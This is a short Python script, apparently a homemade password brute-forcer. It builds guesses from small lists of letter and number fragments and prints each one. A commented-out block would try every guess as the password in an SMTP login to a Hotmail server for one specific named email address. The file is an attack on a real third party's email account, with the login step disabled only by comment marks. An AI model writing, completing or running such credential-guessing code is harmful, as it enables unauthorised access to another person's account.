import email
import smtplib
import time
import datetime
letter=['mr','ma','jr','ja','mj']
num=['22','26','18','81','62']
from numba import njit,prange

n=0

s=datetime.datetime.now()
print(s)

@njit(fastmath=True ,cache=True,parallel=True)
def solve():
    n=0
    for i in prange(len(letter)):
        password1=''
        password1=letter[i]+" "
        
        for j in prange(len(num)):
            password2=''
            password2=password1+num[j]+" "
            
            for y in prange(len(letter)):
                password3=''
                password3=password2+letter[y]+" "
                
                for x in prange(len(num)):
                    password4=''
                    password4=password3+num[x]+" "
                    password= password4.split()
                    if (password[0]!=password[2] and password[1]!=password[3] ):
                            
                            n=n+1
                            print(password4)
                            # try:
                            #     msg = email.message_from_string('warning')
                            #     s = smtplib.SMTP("smtp.live.com",587)
                            #     s.ehlo() # Hostname to send for this command defaults to the fully qualified domain name of the local host.
                            #     s.starttls() #Puts connection to SMTP server in TLS mode
                            #     s.ehlo()
                            #     s.login('umduaa55@hotmail.com', str(password4))
                            #     print(password4+" done")
                            # except :
                            #     print("failed",n)

solve()                            
print(datetime.datetime.now().microsecond-s.microsecond)                        